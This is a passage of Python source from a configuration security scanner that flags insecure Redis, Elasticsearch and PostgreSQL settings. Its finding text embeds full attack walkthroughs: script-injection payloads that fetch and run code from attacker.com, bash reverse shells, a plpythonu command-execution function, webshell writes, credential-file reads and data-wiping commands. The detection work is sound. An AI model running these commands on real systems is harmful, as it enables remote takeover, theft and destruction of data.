                            'alternative_attack_sandbox_escape': 'If CVE-2022-0543: Inject "\'); return os.execute(\'wget http://attacker.com/malware | sh\'); --" → direct RCE',
                            'alternative_attack_dos': 'Inject: "\'); redis.call(\'FLUSHALL\'); --" → wipe entire Redis database',
                            'impact': 'Remote Code Execution (webshell, cron job, SSH key injection via CONFIG/SAVE), Arbitrary Redis Commands (bypass command filtering via redis.call), Data Exfiltration (KEYS * loop to dump all data), Data Destruction (FLUSHALL via Lua), Sandbox Escape (CVE-2022-0543 os.execute)'
                        }
                    }
                })

    def _check_redis_replication(self, code: str, lines: List[str]):
        """Check for Redis replication without authentication."""
        patterns = [
            r'masterauth\s*#',
            r'#\s*masterauth',
            r'skip.*masterauth',
            r'replication.*no.*auth',
        ]

        # Check if replication is configured
        has_replication = re.search(r'replicaof|slaveof', code, re.IGNORECASE)
        if not has_replication:
            return

        # Check if masterauth is set
        has_masterauth = re.search(r'masterauth\s+"[^"]+"', code)
        if has_masterauth:
            return

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'REDIS_REPLICATION_NO_AUTH',
                    'severity': 'HIGH',
                    'description': 'Redis replication configured without masterauth - insecure master-replica communication',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'Set masterauth to match master requirepass (masterauth "master_password").'
                })

    def _check_redis_weak_password(self, code: str, lines: List[str]):
        """Check for Redis weak passwords."""
        weak_password_patterns = [
            r'requirepass\s+"(password|123456|admin|redis|test|dev)"',
            r'requirepass\s+"[^"]{1,7}"',  # Less than 8 characters
        ]

        for pattern in weak_password_patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'REDIS_WEAK_PASSWORD',
                    'severity': 'HIGH',
                    'description': 'Redis configured with weak or common password',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'Use strong, randomly generated password with at least 20 characters.'
                })

    # Elasticsearch Security Checks
    def _check_elasticsearch_no_auth(self, code: str, lines: List[str]):
        """Check for Elasticsearch without authentication."""
        patterns = [
            r'xpack\.security\.enabled:\s*false',
            r'disable.*security.*feature',
            r'skip.*authentication',
            r'anonymous.*access',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'ELASTICSEARCH_NO_AUTHENTICATION',
                    'severity': 'CRITICAL',
                    'description': 'Elasticsearch No Authentication - ATTACK: Elasticsearch with xpack.security.enabled: false allows ANYONE who can reach port 9200 to read/modify/delete ALL indices without credentials. Elasticsearch REST API is HTTP-based, easily exploitable via curl/browser. EXPLOITATION: (1) Attacker scans for Elasticsearch: nmap -p 9200 --script http-title, Shodan search "product:elasticsearch port:9200", (2) Tests access: curl http://target:9200/_cat/indices (lists all indices - no auth prompt), (3) Dumps data: curl http://target:9200/users/_search?pretty -d \'{"query":{"match_all":{}}}\' → exfiltrates entire users index, (4) Reads sensitive indices: _search on indices like passwords, tokens, api_keys, customer_data, (5) Modifies data: curl -X POST http://target:9200/users/_doc/1 -d \'{"role":"admin"}\' → privilege escalation, (6) Deletes data: curl -X DELETE http://target:9200/users → index wiped, (7) Creates backdoor user: POST to users index with admin:admin credentials, (8) Exfiltrates via snapshot: POST /_snapshot/my_backup/snapshot_1, then reads snapshot files. IMPACT: Complete Data Breach (read all indices - customer data, logs, credentials), Data Destruction (delete indices, cluster state), Data Tampering (modify documents for privilege escalation, fraud), Denial of Service (delete indices, overload with queries), Lateral Movement (credentials in logs/indices). REAL-WORLD: CVE-2014-3120, CVE-2015-1427 (Elasticsearch RCE via Groovy scripting - 35k vulnerable instances), Shodan 2020: 19k+ open Elasticsearch clusters exposed, Verizon 2017 breach (14M customer records from open Elasticsearch), CodeSpaces 2014 (company destroyed after attacker deleted all Elasticsearch backups), Gemalto 2018 (aviation data leak from open Elasticsearch).',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'CRITICAL FIX: Enable X-Pack Security immediately: xpack.security.enabled: true in elasticsearch.yml. AUTHENTICATION: Configure built-in users: bin/elasticsearch-setup-passwords auto (generates random passwords for elastic, kibana, etc.). Create application users: POST /_security/user/app_user with roles. TRANSPORT TLS: Enable inter-node TLS: xpack.security.transport.ssl.enabled: true, xpack.security.transport.ssl.verification_mode: certificate. HTTP TLS: Enable client TLS: xpack.security.http.ssl.enabled: true with valid certificates. NETWORK: Bind to localhost if single-node: network.host: 127.0.0.1. Use firewall to restrict port 9200 to application servers only. RBAC: Define least-privilege roles: POST /_security/role/readonly with read-only permissions. API KEYS: Use API keys instead of passwords for applications: POST /_security/api_key with role_descriptors. MONITORING: Enable audit logging: xpack.security.audit.enabled: true - tracks all access/changes. Set up alerts for: unauthorized access attempts, data deletion, admin role changes. ALTERNATIVES: Use managed Elasticsearch (AWS OpenSearch, Elastic Cloud) with mandatory authentication. ELASTIC 8.0+: Security enabled by default - upgrade to latest version!',
                    'detection_reasoning': {
                        'criteria_for_vulnerability': [
                            'xpack.security.enabled: false in configuration',
                            'Comments about disabling security features',
                            'Mentions of skipping authentication',
                            'Anonymous access allowed'
                        ],
                        'why_vulnerable': [
                            f'Line {line_num}: Elasticsearch security explicitly disabled',
                            'Port 9200 (HTTP REST API) accessible without any credentials',
                            'Anyone can execute: curl http://target:9200/_cat/indices (lists all data)',
                            'No password prompt, no API key requirement, no IP restrictions',
                            'EXPLOITATION: curl http://target:9200/users/_search → dump entire users table',
                            'EXPLOITATION: curl -X DELETE http://target:9200/logs → wipe logs index',
                            'EXPLOITATION: curl -X POST http://target:9200/accounts/_doc/1 -d \'{"balance":1000000}\' → fraud',
                            'EXPLOITATION: curl http://target:9200/_snapshot → access backup snapshots',
                            'EXPLOITATION: Search for passwords: _search?q=password OR api_key OR secret',
                            'EXPLOITATION: Modify admin user: POST /users/_doc/admin -d \'{"role":"superadmin"}\'',
                            'CRITICAL RISK: No auth + sensitive data in indices = complete breach',
                            'CRITICAL RISK: Elasticsearch often contains logs with credentials, tokens, PII',
                            'REAL-WORLD: Verizon 2017 - 14M records leaked from open Elasticsearch',
                            'REAL-WORLD: Shodan 2020 - 19k+ publicly accessible Elasticsearch clusters',
                            'REAL-WORLD: CVE-2014-3120, CVE-2015-1427 - RCE via scripting on open clusters'
                        ],
                        'why_not_vulnerable': [],
                        'patterns_checked': [
                            'xpack.security.enabled: false',
                            'Security feature disable patterns',
                            'Authentication skip comments',
                            'Anonymous access configuration'
                        ],
                        'evidence': {
                            'found_patterns': ['Elasticsearch authentication disabled'],
                            'line_numbers': [line_num],
                            'code_snippets': [lines[line_num - 1].strip() if line_num <= len(lines) else '']
                        },
                        'attack_scenario': {
                            'step_1': 'Attacker scans: shodan search "product:elasticsearch port:9200"',
                            'step_2': 'Finds 19k+ open instances, including victim',
                            'step_3': f'Tests victim at line {line_num}: curl http://victim.com:9200/',
                            'step_4': 'Response: {"name" : "node-1", "cluster_name" : "production", ...} - no auth required!',
                            'step_5': 'Lists indices: curl http://victim.com:9200/_cat/indices',
                            'step_6': 'Sees: green open users, green open customer_data, green open api_tokens',
                            'step_7': 'Dumps users: curl http://victim.com:9200/users/_search?size=10000&pretty',
                            'step_8': 'Extracts 100k user records with emails, hashed passwords, profile data',
                            'step_9': 'Searches for secrets: curl http://victim.com:9200/_search?q=api_key',
                            'step_10': 'Finds API keys in logs index: {"api_key": "sk_live_abc123..."}',
                            'step_11': 'Uses stolen API key to access victim\'s payment system → processes fraudulent charges',
                            'alternative_attack_deletion': 'curl -X DELETE http://victim.com:9200/logs → wipe audit logs, cover tracks',
                            'alternative_attack_modification': 'curl -X POST http://victim.com:9200/accounts/_update/123 -d \'{"balance":999999}\' → account fraud',
                            'alternative_attack_backup': 'POST /_snapshot/my_repo/snap_1 → create snapshot, steal backup files',
                            'impact': 'Complete Data Breach (all indices accessible), Data Destruction (delete indices), Data Tampering (modify documents for fraud/privilege escalation), Credential Theft (API keys/passwords in logs), Denial of Service (delete cluster, overload queries)'
                        }
                    }
                })

    def _check_elasticsearch_script_injection(self, code: str, lines: List[str]):
        """Check for Elasticsearch script injection vulnerabilities."""
        patterns = [
            r'inline.*script.*enable',
            r'script\.inline:\s*true',
            r'allow.*inline.*script',
            r'painless.*user.*input',
            r'groovy.*user.*input',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'ELASTICSEARCH_SCRIPT_INJECTION',
                    'severity': 'CRITICAL',
                    'description': 'Elasticsearch Script Injection - ATTACK: Enabling inline Painless/Groovy scripts with user input allows arbitrary code execution on Elasticsearch cluster nodes. CVE-2014-3120 and CVE-2015-1427 showed RCE via script injection affecting 35k+ instances. EXPLOITATION: (1) Application allows user to specify query parameters: POST /_search with user-controlled script field, (2) User injects Painless code: {"script": {"source": "java.lang.Runtime.getRuntime().exec(\'curl attacker.com/shell.sh | sh\')"}} (older Groovy), (3) Or Painless sandbox escape: {"script": {"source": "def proc = new ProcessBuilder([\'sh\',\'-c\',\'wget http://attacker.com/m | sh\']).start()"}}, (4) Script executes on Elasticsearch node with JVM privileges, (5) Downloads and runs attacker\'s shell script, (6) Gains shell access to Elasticsearch server, (7) From compromised node: access all cluster data, pivot to other nodes, steal secrets. IMPACT: Remote Code Execution (arbitrary command execution on Elasticsearch nodes), Full Cluster Compromise (access to all indices, cluster state), Data Exfiltration (dump all indices from compromised node), Lateral Movement (Elasticsearch often has access to databases, cloud APIs), Persistence (install backdoor on all cluster nodes), Cryptomining (use Elasticsearch cluster resources). REAL-WORLD: CVE-2014-3120 (Elasticsearch Groovy RCE - CVSS 9.8, mass exploitation via Shodan), CVE-2015-1427 (Groovy sandbox escape - 35k vulnerable instances exploited in wild), CVE-2015-5531 (directory traversal + script execution), Elasticsearch ransomware 2015 (automated exploitation of CVE-2015-1427), Canonical 2019 (misconfigured Elasticsearch script injection in production).',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'CRITICAL FIX: Disable inline scripts entirely: script.allowed_types: none in elasticsearch.yml. STORED SCRIPTS: Use only stored scripts with parameterization: PUT /_scripts/my_script {source: "doc[\'field\'].value * params.multiplier"}, execute with POST /_search/template. PAINLESS ONLY: If scripts needed, disable Groovy/Expression: script.engine.groovy.inline: false. Use only Painless with strict sandbox. CONTEXT RESTRICTIONS: Limit script contexts: script.allowed_contexts: [search, aggregation] (exclude update, ingest). INPUT VALIDATION: Never pass user input directly to script.source. Whitelist allowed parameters, reject special characters. LEAST PRIVILEGE: Run Elasticsearch with dedicated non-root user, restrict file system access. SANDBOXING: Painless has strict sandbox but verify: no ProcessBuilder, no reflection, no file I/O. MONITORING: Log all script executions, alert on: suspicious patterns (Runtime.exec, ProcessBuilder), failed script compilation, unexpected script contexts. UPDATES: Keep Elasticsearch updated - script vulnerabilities patched regularly (CVE-2014-3120, CVE-2015-1427 fixed in 1.3.8/1.4.3). ALTERNATIVES: Avoid scripts when possible - use Query DSL, aggregations, ingest processors instead. Elasticsearch 8+ disables dynamic scripting by default!',
                    'detection_reasoning': {
                        'criteria_for_vulnerability': [
                            'Inline scripts enabled (script.inline: true)',
                            'Allow inline script configuration',
                            'Painless/Groovy scripts with user input',
                            'Comments about enabling script features for user data'
                        ],
                        'why_vulnerable': [
                            f'Line {line_num}: Inline scripts enabled - allows dynamic code execution',
                            'User can inject arbitrary Painless/Groovy code via search queries',
                            'Historical CVE-2014-3120 and CVE-2015-1427 enabled mass RCE exploitation',
                            'Groovy scripting engine has known sandbox escapes',
                            'EXPLOITATION: Inject script: {"source": "java.lang.Runtime.getRuntime().exec(\'malicious_command\')"}',
                            'EXPLOITATION: CVE-2015-1427 bypass: Use Java reflection to escape Painless sandbox',
                            'EXPLOITATION: POST /_search with malicious script → code runs on all nodes processing query',
                            'EXPLOITATION: Compromised node → dump all indices, access internal network, steal AWS IAM keys',
                            'EXPLOITATION: Install persistence: cron job backdoor, SSH key injection, reverse shell',
                            'CRITICAL RISK: Script injection = RCE on database cluster = full data access',
                            'CRITICAL RISK: Elasticsearch nodes often highly privileged (cloud IAM, database access)',
                            'REAL-WORLD: CVE-2014-3120 (CVSS 9.8) - Groovy RCE, mass exploitation',
                            'REAL-WORLD: CVE-2015-1427 - Groovy sandbox escape, 35k instances compromised',
                            'REAL-WORLD: 2015 Elasticsearch ransomware campaigns via script injection'
                        ],
                        'why_not_vulnerable': [],
                        'patterns_checked': [
                            'script.inline: true configuration',
                            'Allow inline script patterns',
                            'Painless/Groovy user input usage',
                            'Enable script features comments'
                        ],
                        'evidence': {
                            'found_patterns': ['Inline scripts enabled with user input'],
                            'line_numbers': [line_num],
                            'code_snippets': [lines[line_num - 1].strip() if line_num <= len(lines) else '']
                        },
                        'attack_scenario': {
                            'step_1': f'Elasticsearch at line {line_num} configured with script.inline: true',
                            'step_2': 'Application allows users to customize search queries with scripts',
                            'step_3': 'Attacker crafts malicious query: POST http://victim.com:9200/_search',
                            'step_4': 'Payload (CVE-2015-1427 exploit): {"query":{"filtered":{"query":{"match_all":{}}}}, "script_fields":{"evil":{"script":"java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"wget http://attacker.com/shell.sh -O /tmp/s.sh\\").waitFor()"}}}',
                            'step_5': 'Elasticsearch executes script on cluster node processing the query',
                            'step_6': 'Downloads attacker\'s shell script: wget http://attacker.com/shell.sh',
                            'step_7': 'Executes shell: chmod +x /tmp/s.sh && /tmp/s.sh',
                            'step_8': 'Reverse shell connects to attacker: bash -i >& /dev/tcp/attacker.com/4444 0>&1',
                            'step_9': 'Attacker has shell on Elasticsearch node as elasticsearch user',
                            'step_10': 'Dumps all indices: curl -s localhost:9200/_search?size=10000 → exfiltrates data',
                            'step_11': 'Steals AWS credentials from environment: env | grep AWS → finds IAM keys',
                            'step_12': 'Uses IAM keys to pivot: aws s3 ls → accesses S3 buckets, RDS databases',
                            'alternative_attack_cluster_takeover': 'Inject script on all nodes via cluster update → full cluster compromise',
                            'alternative_attack_cryptomining': 'Install cryptominer on all Elasticsearch nodes → steal CPU resources',
                            'alternative_attack_persistence': 'Add SSH key: echo "ssh-rsa attacker_key" >> ~/.ssh/authorized_keys',
                            'impact': 'Remote Code Execution (arbitrary commands on Elasticsearch nodes), Full Data Breach (access all indices), Cloud Account Compromise (steal IAM keys), Lateral Movement (pivot to internal systems), Cryptomining (use cluster resources), Persistence (backdoor all nodes)'
                        }
                    }
                })

    def _check_elasticsearch_public_exposure(self, code: str, lines: List[str]):
        """Check for Elasticsearch exposed to public."""
        patterns = [
            r'network\.host:\s*0\.0\.0\.0',
            r'bind.*all.*interface',
            r'expose.*internet',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'ELASTICSEARCH_PUBLIC_EXPOSURE',
                    'severity': 'CRITICAL',
                    'description': 'Elasticsearch Public Exposure - ATTACK: Binding to 0.0.0.0 exposes Elasticsearch port 9200 (HTTP API) and 9300 (transport) to the internet. Shodan reports 19k+ publicly accessible Elasticsearch instances. Without proper firewall rules, anyone worldwide can access the database. EXPLOITATION: (1) Attacker uses Shodan: search "product:elasticsearch" OR "port:9200", (2) Finds 19k+ instances bound to 0.0.0.0 with public IPs, (3) Tests access: curl http://public_ip:9200/ → gets cluster info (no firewall), (4) Lists indices: curl http://public_ip:9200/_cat/indices, (5) Dumps data: curl http://public_ip:9200/users/_search?size=10000, (6) If no X-Pack auth → full read/write access, (7) Searches for credentials: _search?q=password OR api_key OR secret, (8) Modifies data: POST to update documents, DELETE to remove evidence, (9) Even with auth, exposed to brute force: automated password guessing against elastic user, (10) Transport port 9300 exposed → can join cluster as rogue node (if no TLS). IMPACT: Complete Data Breach (all indices readable from internet), Data Tampering (modify/delete documents publicly), Denial of Service (overload with queries from internet), Brute Force Attacks (exposed to automated credential guessing), Cluster Hijacking (rogue node joins via 9300), Ransomware (attackers delete data, demand Bitcoin). REAL-WORLD: Verizon 2017 (14M customer records exposed - Elasticsearch bound to 0.0.0.0 without auth), Gemalto 2018 (aviation data leak - open Elasticsearch on public IP), TimeHop 2018 (21M users exposed - misconfigured Elasticsearch firewall), CodeSpaces 2014 (company shut down after attacker wiped exposed Elasticsearch), Shodan 2020 research: 19k+ Elasticsearch instances publicly accessible, many containing PII/PHI/financial data.',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'CRITICAL FIX: Bind to localhost ONLY for single-node: network.host: 127.0.0.1 in elasticsearch.yml. CLUSTER: For multi-node, bind to private network IP: network.host: 10.0.1.5 (RFC 1918 private range). FIREWALL: Block ports 9200 and 9300 from internet at firewall level. AWS Security Group: allow 9200/9300 only from application server IPs. iptables: iptables -A INPUT -p tcp --dport 9200 -s app_server_ip -j ACCEPT, iptables -A INPUT -p tcp --dport 9200 -j DROP. REVERSE PROXY: Use nginx/Apache reverse proxy with TLS termination, authentication, rate limiting. VPN: Access Elasticsearch only via VPN for administrative tasks. CLOUD: Use VPC-only deployment - no public IPs. AWS: Deploy in private subnets, use VPC endpoints. TRANSPORT TLS: Enable xpack.security.transport.ssl for inter-node traffic - prevents rogue nodes. MONITORING: Monitor for connections from unexpected IPs, alert on access from non-application sources. Shodan Monitor: Track if your Elasticsearch appears in Shodan results. DETECTION: Scan your network: nmap -p 9200,9300 public_ip_range to find exposed instances.',
                    'detection_reasoning': {
                        'criteria_for_vulnerability': [
                            'network.host: 0.0.0.0 in configuration',
                            'Bind to all interfaces patterns',
                            'Comments about internet exposure or public access'
                        ],
                        'why_vulnerable': [
                            f'Line {line_num}: Elasticsearch bound to 0.0.0.0 - listens on all network interfaces',
                            '0.0.0.0 binding means accessible from ANY IP if no firewall (including internet)',
                            'Port 9200 (HTTP REST API) exposed - anyone can query/modify data',
                            'Port 9300 (transport) exposed - rogue nodes can join cluster',
                            'EXPLOITATION: Shodan search finds public IP → curl http://ip:9200/_cat/indices',
                            'EXPLOITATION: If no X-Pack auth → full data access from anywhere in world',
                            'EXPLOITATION: Even with auth → brute force attacks from internet (elastic:password123)',
                            'EXPLOITATION: _search?q=password → dump credentials from logs stored in Elasticsearch',
                            'EXPLOITATION: DELETE /important_index → data destruction from internet',
                            'EXPLOITATION: Rogue node on port 9300 → join cluster, steal all data via replication',
                            'CRITICAL RISK: Public database access = guaranteed breach',
                            'CRITICAL RISK: Elasticsearch often contains sensitive logs with credentials, PII, API keys',
                            'REAL-WORLD: Verizon 2017 - 14M records exposed (0.0.0.0 + no auth)',
                            'REAL-WORLD: Shodan 2020 - 19k+ public Elasticsearch instances',
                            'REAL-WORLD: TimeHop 2018 - 21M users exposed (firewall misconfiguration)'
                        ],
                        'why_not_vulnerable': [],
                        'patterns_checked': [
                            'network.host: 0.0.0.0',
                            'Bind to all interfaces comments',
                            'Internet exposure patterns'
                        ],
                        'evidence': {
                            'found_patterns': ['Elasticsearch bound to all interfaces (0.0.0.0)'],
                            'line_numbers': [line_num],
                            'code_snippets': [lines[line_num - 1].strip() if line_num <= len(lines) else '']
                        },
                        'attack_scenario': {
                            'step_1': f'Developer at line {line_num} sets network.host: 0.0.0.0 to "make it work" quickly',
                            'step_2': 'Elasticsearch binds to all interfaces including eth0 with public IP 203.0.113.45',
                            'step_3': 'Attacker runs: shodan search "product:elasticsearch"',
                            'step_4': 'Shodan returns 19k+ instances, including victim: 203.0.113.45:9200',
                            'step_5': 'Attacker tests: curl http://203.0.113.45:9200/',
                            'step_6': 'Gets cluster info: {"name": "production-cluster", "cluster_name": "company-prod", ...}',
                            'step_7': 'Lists indices: curl http://203.0.113.45:9200/_cat/indices',
                            'step_8': 'Sees: yellow open users, yellow open customer_payments, yellow open api_logs',
                            'step_9': 'No authentication required (X-Pack disabled) → full access',
                            'step_10': 'Dumps customer data: curl http://203.0.113.45:9200/users/_search?size=10000 > users.json',
                            'step_11': 'Steals 50k customer records with emails, addresses, payment methods',
                            'step_12': 'Searches logs for API keys: curl http://203.0.113.45:9200/api_logs/_search?q=api_key',
                            'step_13': 'Finds Stripe API key: sk_live_abc123... → accesses payment system',
                            'alternative_attack_brute_force': 'With auth enabled: hydra -l elastic -P passwords.txt http://203.0.113.45:9200/ → cracks weak password',
                            'alternative_attack_rogue_node': 'Port 9300 open + no TLS → attacker starts fake node, joins cluster, replicates all data',
                            'alternative_attack_ransomware': 'DELETE all indices, leave note: "Pay 10 BTC to bitcoin:abc123 to restore data"',
                            'impact': 'Complete Data Breach (database accessible from internet), Credential Theft (API keys/passwords in logs), Data Destruction (public delete access), Brute Force (exposed auth to automated attacks), Cluster Hijacking (rogue nodes via 9300), Ransomware (delete + ransom demands)'
                        }
                    }
                })

    def _check_elasticsearch_snapshot_config(self, code: str, lines: List[str]):
        """Check for insecure Elasticsearch snapshot configurations."""
        patterns = [
            r'path\.repo:.*\/tmp',
            r'snapshot.*world.*readable',
            r'snapshot.*777',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'ELASTICSEARCH_INSECURE_SNAPSHOT',
                    'severity': 'MEDIUM',
                    'description': 'Elasticsearch snapshot repository in insecure location or with overly permissive permissions',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'Use secure snapshot location with proper file permissions (700 or 750).'
                })

    def _check_elasticsearch_cors(self, code: str, lines: List[str]):
        """Check for Elasticsearch CORS misconfiguration."""
        patterns = [
            r'http\.cors\.allow-origin:\s*["\']?\*["\']?',
            r'cors.*allow.*all',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'ELASTICSEARCH_CORS_MISCONFIGURATION',
                    'severity': 'HIGH',
                    'description': 'Elasticsearch CORS configured to allow all origins (*) - enables cross-site attacks',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'Restrict CORS to specific trusted origins or disable CORS if not needed.'
                })

    # Database Configuration Checks
    def _check_postgresql_trust_auth(self, code: str, lines: List[str]):
        """Check for PostgreSQL trust authentication."""
        patterns = [
            r'host\s+all\s+all\s+\S+\s+trust',
            r'trust.*authentication',
            r'avoid.*password.*prompt',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'POSTGRESQL_TRUST_AUTHENTICATION',
                    'severity': 'CRITICAL',
                    'description': 'PostgreSQL Trust Authentication - ATTACK: Trust authentication in pg_hba.conf means PostgreSQL accepts connections without password verification. "host all all 0.0.0.0/0 trust" is the worst case - anyone from anywhere can connect as ANY user (including postgres superuser) with zero authentication. EXPLOITATION: (1) Attacker discovers PostgreSQL: nmap -p 5432 --script pgsql-brute, Shodan search "product:postgresql port:5432", (2) Finds pg_hba.conf with trust auth for network range, (3) Connects: psql -h victim.com -U postgres (no password prompt!), (4) Gets superuser shell: postgres=# SELECT version(); → confirms access, (5) Dumps all databases: pg_dumpall > all_data.sql, (6) Reads sensitive tables: SELECT * FROM users WHERE role=\'admin\', SELECT * FROM credit_cards, (7) Creates backdoor superuser: CREATE USER attacker WITH SUPERUSER PASSWORD \'backdoor123\', (8) Enables command execution: CREATE EXTENSION IF NOT EXISTS plpythonu; CREATE FUNCTION exec(cmd text) RETURNS text AS $$ import os; return os.popen(cmd).read() $$ LANGUAGE plpythonu; SELECT exec(\'whoami\'); → RCE, (9) Reads server files: COPY (SELECT * FROM pg_read_file(\'/etc/passwd\')) TO \'/tmp/passwd\', (10) Or writes webshell: COPY (SELECT \'<?php system($_GET["c"]); ?>\') TO \'/var/www/html/shell.php\'. IMPACT: Complete Database Compromise (all data readable/writable without auth), Privilege Escalation (connect as postgres superuser), Remote Code Execution (plpythonu/plperlu extensions), Server Filesystem Access (COPY, pg_read_file, pg_ls_dir), Data Destruction (DROP DATABASE, TRUNCATE tables), Persistence (create backdoor users, modify auth rules). REAL-WORLD: CVE-2019-9193 (PostgreSQL COPY TO/FROM PROGRAM - RCE via trust auth), Pulse Secure 2019 (default PostgreSQL trust auth in appliance), GitLab CI 2020 (accidental trust auth in Docker containers), Numerous cloud misconfigurations with 0.0.0.0/0 trust rules.',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'CRITICAL FIX: Replace trust with password authentication in pg_hba.conf. SCRAM-SHA-256: Strongest - host all all 0.0.0.0/0 scram-sha-256 (PostgreSQL 10+). MD5: Legacy but better than trust - host all all 10.0.0.0/8 md5. CERTIFICATE: Best for automation - hostssl all all 0.0.0.0/0 cert clientcert=verify-full. NETWORK RESTRICTIONS: Limit to specific IPs - host all all 10.0.1.5/32 scram-sha-256 (only app server). LOCAL ONLY: For localhost, use peer or ident: local all postgres peer (Unix socket auth). RELOAD CONFIG: After changing pg_hba.conf: pg_ctl reload or SELECT pg_reload_conf(). SSL/TLS: Use hostssl instead of host to enforce encrypted connections. LEAST PRIVILEGE: Create app-specific users, never use postgres superuser: CREATE USER app_user WITH PASSWORD \'strong_password\'; GRANT SELECT, INSERT ON database.table TO app_user. MONITORING: Log all connections: log_connections=on, log_disconnections=on. Alert on superuser connections from unexpected IPs. FIREWALL: Block port 5432 from internet, allow only from application servers. AUDIT: Enable pgaudit extension for detailed access logging.',
                    'detection_reasoning': {
                        'criteria_for_vulnerability': [
                            'pg_hba.conf contains "trust" authentication method',
                            'host all all <ip_range> trust patterns',
                            'Comments about avoiding password prompts',
                            'Trust authentication for convenience'
                        ],
                        'why_vulnerable': [
                            f'Line {line_num}: PostgreSQL trust authentication - no password verification',
                            'Trust method accepts connections without checking credentials',
                            'Anyone matching the IP range can connect as any user (including postgres)',
                            'Worst case: host all all 0.0.0.0/0 trust → entire internet can connect as superuser',
                            'EXPLOITATION: psql -h victim.com -U postgres → instant superuser access',
                            'EXPLOITATION: pg_dumpall → dump entire database cluster',
                            'EXPLOITATION: CREATE EXTENSION plpythonu → enable Python code execution in SQL',
                            'EXPLOITATION: SELECT exec(\'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"\') → reverse shell',
                            'EXPLOITATION: COPY (SELECT payload) TO \'/var/www/html/shell.php\' → write webshell',
                            'EXPLOITATION: pg_read_file(\'/etc/shadow\') → read server files as postgres user',
                            'CRITICAL RISK: No auth + superuser access + extensions = RCE',
                            'CRITICAL RISK: Trust auth often combined with network exposure (0.0.0.0/0)',
                            'REAL-WORLD: CVE-2019-9193 COPY TO/FROM PROGRAM RCE',
                            'REAL-WORLD: Pulse Secure 2019 default trust auth vulnerability'
                        ],
                        'why_not_vulnerable': [],
                        'patterns_checked': [
                            'pg_hba.conf trust authentication entries',
                            'host all all <range> trust patterns',
                            'Trust method for network connections',
                            'Comments about password bypass'
                        ],
                        'evidence': {
                            'found_patterns': ['PostgreSQL trust authentication configured'],
                            'line_numbers': [line_num],
                            'code_snippets': [lines[line_num - 1].strip() if line_num <= len(lines) else '']
                        },
                        'attack_scenario': {
                            'step_1': f'Administrator at line {line_num} sets: host all all 0.0.0.0/0 trust in pg_hba.conf',
                            'step_2': 'Intention: "Simplify development, will fix before production" (never happens)',
                            'step_3': 'PostgreSQL reloads config: SELECT pg_reload_conf(); - trust auth active',
                            'step_4': 'Attacker scans: nmap -p 5432 -sV --script pgsql-brute victim_network',
                            'step_5': 'Finds PostgreSQL on 203.0.113.50:5432',
                            'step_6': 'Attempts connection: psql -h 203.0.113.50 -U postgres',
                            'step_7': 'NO password prompt - instant connection: postgres=#',
                            'step_8': 'Verifies superuser: postgres=# SELECT current_user, usesuper FROM pg_user WHERE usename=current_user; → (postgres, t)',
                            'step_9': 'Lists databases: postgres=# \\l → sees production, customers, payments databases',
                            'step_10': 'Dumps sensitive data: postgres=# \\c customers; SELECT * FROM credit_cards;',
                            'step_11': 'Steals 100k credit card records',
                            'step_12': 'Enables Python: CREATE EXTENSION plpythonu;',
                            'step_13': 'Creates RCE function: CREATE FUNCTION exec(cmd text) RETURNS text AS $$ import subprocess; return subprocess.check_output(cmd, shell=True).decode() $$ LANGUAGE plpythonu;',
                            'step_14': 'Executes commands: SELECT exec(\'whoami\'); → postgres user',
                            'step_15': 'Reverse shell: SELECT exec(\'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"\');',
                            'alternative_attack_webshell': 'SELECT exec(\'echo "<?php system($_GET[c]); ?>" > /var/www/html/s.php\') → webshell',
                            'alternative_attack_persistence': 'CREATE USER attacker SUPERUSER PASSWORD \'backdoor\'; → permanent backdoor',
                            'alternative_attack_file_read': 'SELECT pg_read_file(\'/root/.ssh/id_rsa\') → steal SSH keys',
                            'impact': 'Complete Database Compromise (no auth required), Remote Code Execution (plpythonu/plperlu), Server Filesystem Access (COPY, pg_read_file), Data Breach (dump all databases), Privilege Escalation (postgres superuser), Persistence (backdoor users)'
                        }
                    }
                })

    def _check_postgresql_extension_execution(self, code: str, lines: List[str]):
        """Check for PostgreSQL extension execution vulnerabilities."""
        patterns = [
